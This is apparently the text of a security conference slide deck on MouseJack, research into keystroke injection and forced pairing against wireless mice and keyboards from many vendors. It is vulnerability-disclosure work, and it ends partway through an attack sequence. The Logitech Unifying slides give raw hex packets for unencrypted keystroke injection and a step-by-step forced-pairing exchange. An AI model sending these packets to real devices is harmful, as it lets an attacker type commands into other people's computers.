MouseJack: Injecting Keystrokes into 
Wireless Mice
Marc Newlin / PI:EMAIL / @marcnewlin
Marc Newlin
Security Researcher @ Bastille Networks
Agenda
1.
Overview
2.
Research Process 
3.
Protocols and Vulnerabilities
4.
Vendor Responses
5.
Demo
1. Overview
Types of Vulnerabilities
● Forced Device Pairing
● Keystroke Sniffing 
● Unencrypted Keystroke Injection
● Encrypted Keystroke Injection 
● Malicious Macro Programming 
● Denial of Service 
Affected Vendors
●
AmazonBasics
●
Anker
●
Dell
●
EagleTec
●
GE
●
Gigabyte
●
HDE
●
Hewlett-Packard
●
Insignia
●
Kensington
●
Lenovo
●
Logitech
●
Microsoft
●
RadioShack
●
ShhhMouse
●
Toshiba
Related Work
Thorsten Schroeder and Max Moser
●
“Practical Exploitation of Modern Wireless Devices” (KeyKeriki) 
●
Research into XOR encrypted Microsoft wireless keyboards
Travis Goodspeed
●
“Promiscuity is the nRF24L01+’s Duty”
●
Research into nRF24L pseudo-promiscuous mode functionality 
Samy Kamkar
●
KeySweeper
●
Microsoft XOR encrypted wireless keyboard sniffer 
Common Transceivers 
●
General purpose transceivers with proprietary protocols 
●
Mouse/keyboard specific transceivers used as-is 
●
All devices use 2.4GHz GFSK 
●
Combination of protocol weaknesses and implementation flaws 
Nordic Semiconductor nRF24L
●
2.4GHz general purpose transceivers 
●
250kbps, 1Mbps, 2Mbps data rates 
●
0, 1, or 2 byte CRC
●
2400-2525MHz, 1MHz steps 
●
XCVR only or 8051-based SoC
nRF24L Family
Shockburst and Enhanced Shockburst
Texas Instruments CC254X
●
2.4GHz general purpose transceivers
●
Used in some Logitech keyboards and mice
●
Logitech firmware is OTA compatible with nRF24L based devices 
●
All we care about is that they work like the nRF424L
MOSART Semiconductor
● Undocumented transceiver
● Appears to have mouse/keyboard logic baked in 
● No encryption 
● Most common with second tier vendors 
Signia SGN6210
● (Mostly) undocumented transceiver
● General purpose transceiver
● No encryption 
● Only found (by me) in Toshiba mice and keyboards
GE Mystery Transceiver
● Undocumented transceiver
● No idea who makes this chip 
● No encryption 
2. Research Process
"Since the displacements of a mouse 
would not give any useful information to 
a hacker, the mouse reports are not 
encrypted."
- Logitech
Software Defined Radio
●
Great for prototyping and receive only reverse engineering 
●
Not as great for two way comms 
●
Retune timing limitations are a problem
●
USB and processing latency make ACKs difficult 
●
Initial Logitech mouse reverse engineering was all SDR based
NES Controller
●
Built a wireless NES controller for a burning man hat last summer 
●
nRF24L / Teensy based 
●
Should it really be a Logitech mouse controller?????
Logitech mouse presentation clicker @ Iot Village...
CrazyRadio PA
●
nRF24LU1+ based dongle
●
Part of the CrazyFlie project
●
Open source 
●
225 meter injection range 
with yagi antenna 
CrazyRadio + custom firmware = FUZZ ALL THE THINGS!!!!
1.
Install CrazyRadio and target mouse/keyboard dongle into same computer
2.
Disable magic sysrq 
3.
Float the input devices in xinput 
4.
Turn on usbmon, and watch the output of the mouse/keyboard dongle
5.
Fuzz away 
6.
USB dongle does a thing? Save the last few seconds of RF TX data 
7.
Investigate 
“I’ll take one of each, please”
3. Protocols and Vulnerabilities
Logitech Unifying
●
Proprietary protocol used by most Logitech wireless mice/keyboards
●
nRF24L based, but also some CC254X devices
●
Introduced in 2009 
●
Any Unifying dongle can pair with any Unifying device 
●
Dongles support DFU
●
Most devices don’t support DFU
Logitech Unifying - Radio Configuration
Logitech Unifying - Packet Structure
Logitech Unifying - Encryption
● 128-bit AES
● Key generated during pairing process 
● Most keystrokes are encrypted 
● Multimedia keystrokes are not (volume, navigation, etc) 
● Mouse packets are unencrypted 
Logitech Unifying - General Operation
● USB dongles always in receive mode 
● Mice and keyboards always in transmit mode 
● ACK payloads enable dongle to device communication 
Logitech Unifying - Addressing
Logitech Unifying - Wakeup 
● nRF24L supports max 6 receive pipes
● Unifying supports max 6 paired devices
● Unifying dongle always listens on on its own address
● 6 + 1 > 6
● Device sends wake up packet when turned on
Logitech Unifying - Keepalives and Channel Hopping
● Paired device specifies a keepalive timeout
● If the timeout is missed, dongle channel hops to find it 
Logitech Unifying - Mouse Input
Logitech Unifying - Encrypted Keystroke
Logitech Unifying - Unencrypted Multimedia Key
Logitech Unifying - Dongle to Device Communication
● Mouse or keyboard transmits packet to dongle 
● Dongle attaches payload to ACK 
● Status inquiries (battery level, etc) 
● OTA firmware update commands 
● Configuration commands (button macros, etc) 
Logitech Unifying - Pairing
●
Dedicated pairing address BB 0A DC A5 75
●
In pairing mode, dongle listens for 30-60 seconds 
●
When device is switched on and  can’t find its dongle, it tries to pair 
●
Device specifies it’s name, model, serial number, and capabilities
●
Generic process for backward and forward compatibility  
Logitech Unifying - Unencrypted Keystroke Injection
Unencrypted keystrokes can be injected into the address of already paired 
keyboards 
‘a’ key down (scan code 4)
00 C1 00 04 00 00 00 00 00 3B
‘a’ key up (no scan codes specified)
00 C1 00 00 00 00 00 00 00 3F
Logitech Unifying - Forced Pairing (1 of 7)
Attacker transmits pairing request to address of already 
paired mouse 
7F 5F 01 31 33 73 13 37 08 10 25 04 00 02 0C 00 00 00 00 00 71 40
10 25  Device model number (M510 mouse)
Logitech Unifying - Forced Pairing (2 of 7)
Dongle replies with an assigned RF address 
7F 1F 01 EA E1 93 27 15 08 88 02 04 00 02 04 00 00 00 00 00 00 2B
EA E1 93 27 15  Assigned RF address of the pairing device 
Logitech Unifying - Forced Pairing (3 of 7)
Attacker transmits (arbitrary) serial number to dongle on 
the newly assigned RF address 
00 5F 02 00 00 00 00  12 34 56 78 04 00 00 00 01 00 00 00 00 00 86 
12 34 56 78  Device serial number
04 00  Device capabilities (mouse)
Logitech Unifying - Forced Pairing (4 of 7)
Dongle echoes back serial number 
00 1F 02 0F 6B 4F 67 12 34 56 78 04 00 00 00 01 00 00 00 00 00 96
12 34 56 78  Device serial number
Logitech Unifying - Forced Pairing (5 of 7)
Attacker transmits device name 
00 5F 03 01 04 4D 35 31 30 00 00 00 00 00 00 00 00 00 00 00 00 B6
04  Device name length
4D 35 31 30  Device name (ascii string)
Logitech Unifying - Forced Pairing (6 of 7)
Dongle echoes back some bytes from the pairing process 
00 0F 06 02 03 4F 67 12 34 EA
Logitech Unifying - Forced Pairing (7 of 7)
Attacker transmits pairing complete message 
EA 0F 06 01 00 00 00 00 00 00
Logitech Unifying - Pair Keyboard as Mouse (1 of 7)
Attacker transmits pairing request to address of already 
paired mouse 
75 5F 01 62 13 32 16 C3 08 10 25 04 00 02 47 00 00 00 00 00 01 20
10 25  Device model number (M510 mouse)
Logitech Unifying - Pair Keyboard as Mouse (2 of 7)
Dongle replies with an assigned RF address 